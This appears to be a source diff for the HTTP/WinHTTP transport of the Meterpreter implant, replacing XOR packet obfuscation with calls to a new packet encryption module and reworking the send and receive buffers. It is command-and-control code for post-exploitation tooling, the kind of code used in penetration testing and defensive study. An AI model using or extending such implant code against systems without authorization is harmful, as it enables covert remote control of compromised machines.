@@ -7,6 +7,7 @@
 #include "../../common/config.h"
 #include "server_transport_wininet.h"
 #include <winhttp.h>
+#include "../../common/packet_encryption.h"
 
 /*!
  * @brief Prepare a winHTTP request with the given context.
@@ -278,26 +279,13 @@ static DWORD validate_response_winhttp(HANDLE hReq, HttpTransportContext* ctx)
  * @param completion Pointer to the completion routines to process.
  * @return An indication of the result of processing the transmission request.
  */
-static DWORD packet_transmit_http(Remote *remote, Packet *packet, PacketRequestCompletion *completion)
+static DWORD packet_transmit_http(Remote *remote, LPBYTE content, DWORD contentLength)
 {
 	DWORD res = 0;
 	HINTERNET hReq;
 	BOOL result;
 	DWORD retries = 5;
 	HttpTransportContext* ctx = (HttpTransportContext*)remote->transport->ctx;
-	unsigned char *buffer;
-
-	DWORD totalLength = packet->payloadLength + sizeof(PacketHeader);
-
-	buffer = malloc(totalLength);
-	if (!buffer)
-	{
-		SetLastError(ERROR_NOT_FOUND);
-		return 0;
-	}
-
-	memcpy(buffer, &packet->header, sizeof(PacketHeader));
-	memcpy(buffer + sizeof(PacketHeader), packet->payload, packet->payloadLength);
 
 	do
 	{
@@ -307,7 +295,7 @@ static DWORD packet_transmit_http(Remote *remote, Packet *packet, PacketRequestC
 			break;
 		}
 
-		result = ctx->send_req(hReq, buffer, totalLength);
+		result = ctx->send_req(hReq, content, contentLength);
 
 		if (!result)
 		{
@@ -319,7 +307,6 @@ static DWORD packet_transmit_http(Remote *remote, Packet *packet, PacketRequestC
 		dprintf("[PACKET TRANSMIT] request sent.. apparently");
 	} while(0);
 
-	memset(buffer, 0, totalLength);
 	ctx->close_req(hReq);
 	return res;
 }
@@ -335,6 +322,8 @@ static DWORD packet_transmit_via_http(Remote *remote, Packet *packet, PacketRequ
 {
 	Tlv requestId;
 	DWORD res;
+	BYTE* encryptedPacket = NULL;
+	DWORD encryptedPacketLength = 0;
 
 	lock_acquire(remote->lock);
 
@@ -368,19 +357,10 @@ static DWORD packet_transmit_via_http(Remote *remote, Packet *packet, PacketRequ
 			packet_add_completion_handler((LPCSTR)requestId.buffer, completion);
 		}
 
-		dprintf("[PACKET] New xor key for sending");
-		packet->header.xor_key = rand_xor_key();
-		dprintf("[PACKET] XOR Encoding payload");
-		// before transmission, xor the whole lot, starting with the body
-		xor_bytes(packet->header.xor_key, (LPBYTE)packet->payload, packet->payloadLength);
-		dprintf("[PACKET] XOR Encoding header");
-		// then the header
-		xor_bytes(packet->header.xor_key, (LPBYTE)&packet->header.length, 8);
-		// be sure to switch the xor header before writing
-		packet->header.xor_key = htonl(packet->header.xor_key);
+		encrypt_packet(remote, packet, &encryptedPacket, &encryptedPacketLength);
 
 		dprintf("[PACKET] Transmitting packet of length %d to remote", packet->payloadLength);
-		res = packet_transmit_http(remote, packet, completion);
+		res = packet_transmit_http(remote, encryptedPacket, encryptedPacketLength);
 		if (res < 0)
 		{
 			dprintf("[PACKET] transmit failed with return %d\n", res);
@@ -391,6 +371,11 @@ static DWORD packet_transmit_via_http(Remote *remote, Packet *packet, PacketRequ
 	} while (0);
 
 	res = GetLastError();
+
+	if (encryptedPacket != NULL)
+	{
+		free(encryptedPacket);
+	}
 
 	// Destroy the packet
 	packet_destroy(packet);
@@ -413,6 +398,7 @@ static DWORD packet_receive_http(Remote *remote, Packet **packet)
 	PacketHeader header;
 	LONG bytesRead;
 	BOOL inHeader = TRUE;
+	PUCHAR packetBuffer = NULL;
 	PUCHAR payload = NULL;
 	ULONG payloadLength;
 	HttpTransportContext* ctx = (HttpTransportContext*)remote->transport->ctx;
@@ -504,22 +490,35 @@ static DWORD packet_receive_http(Remote *remote, Packet **packet)
 		}
 
 		dprintf("[PACKET RECEIVE HTTP] decoding header");
-		header.xor_key = ntohl(header.xor_key);
-		xor_bytes(header.xor_key, (LPBYTE)&header.length, 8);
-		header.length = ntohl(header.length);
-
-		// Initialize the header
-		vdprintf("[PACKET RECEIVE HTTP] initialising header");
-		// use TlvHeader size here, because the length doesn't include the xor byte
-		payloadLength = header.length - sizeof(TlvHeader);
+		xor_bytes(header.xor_key, (PUCHAR)&header + sizeof(header.xor_key), sizeof(PacketHeader) - sizeof(header.xor_key));
+#ifdef DEBUGTRACE
+		PUCHAR h = (PUCHAR)&header;
+		vdprintf("[TCP] Packet header: [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X]",
+			h[0], h[1], h[2], h[3], h[4], h[5], h[6], h[7], h[8], h[9], h[10], h[11], h[12], h[13], h[14], h[15], h[16], h[17], h[18], h[19], h[20], h[21], h[22], h[23], h[24], h[25], h[26], h[27], h[28], h[29], h[30], h[31]);
+#endif
+		
+		payloadLength = ntohl(header.length) - sizeof(TlvHeader);
+		vdprintf("[REC HTTP] Payload length is %d", payloadLength);
+		DWORD packetSize = sizeof(PacketHeader) + payloadLength;
+		vdprintf("[REC HTTP] total buffer size for the packet is %d", packetSize);
 		payloadBytesLeft = payloadLength;
 
 		// Allocate the payload
-		if (!(payload = (PUCHAR)malloc(payloadLength)))
+		if (!(packetBuffer = (PUCHAR)malloc(packetSize)))
 		{
+			dprintf("[REC HTTP] Failed to create the packet buffer");
 			SetLastError(ERROR_NOT_ENOUGH_MEMORY);
 			break;
 		}
+		dprintf("[REC HTTP] Allocated packet buffer at %p", packetBuffer);
+
+		// we're done with the header data, so we need to re-encode it, as the packet decryptor is going to
+		// handle the extraction for us.
+		xor_bytes(header.xor_key, (LPBYTE)&header.session_guid[0], sizeof(PacketHeader) - sizeof(header.xor_key));
+		// Copy the packet header stuff over to the packet
+		memcpy_s(packetBuffer, sizeof(PacketHeader), (LPBYTE)&header, sizeof(PacketHeader));
+
+		payload = packetBuffer + sizeof(PacketHeader);
 
 		// Read the payload
 		retries = payloadBytesLeft;
@@ -552,26 +551,9 @@ static DWORD packet_receive_http(Remote *remote, Packet **packet)
 		}
 
 		dprintf("[PACKET RECEIVE HTTP] decoding payload");
-		xor_bytes(header.xor_key, payload, payloadLength);
+		SetLastError(decrypt_packet(remote, packet, packetBuffer, packetSize));
 
-		// Allocate a packet structure
-		if (!(localPacket = (Packet *)malloc(sizeof(Packet))))
-		{
-			SetLastError(ERROR_NOT_ENOUGH_MEMORY);
-			break;
-		}
-
-		memset(localPacket, 0, sizeof(Packet));
-
-		localPacket->header.length = header.length;
-		localPacket->header.type = header.type;
-		localPacket->payload = payload;
-		localPacket->payloadLength = payloadLength;
-
-		*packet = localPacket;
-
-		SetLastError(ERROR_SUCCESS);
-
+		free(packetBuffer);
 	} while (0);
 
 	res = GetLastError();
@@ -850,7 +832,7 @@ static DWORD server_dispatch_http(Remote* remote, THREAD* dispatchThread)
 					}
 				}
 
-				// the pointer that we have will be 
+				// the pointer that we have will be
 				dprintf("[DISPATCH] Pointer is at: %p -> %S", csr, csr);
 
 				// patch in the new URI
@@ -874,7 +856,7 @@ static DWORD server_dispatch_http(Remote* remote, THREAD* dispatchThread)
  */
 static void transport_destroy_http(Transport* transport)
 {
-	if (transport && transport->type != METERPRETER_TRANSPORT_SSL)
+	if (transport && transport->type != METERPRETER_TRANSPORT_TCP)
 	{
 		HttpTransportContext* ctx = (HttpTransportContext*)transport->ctx;
 
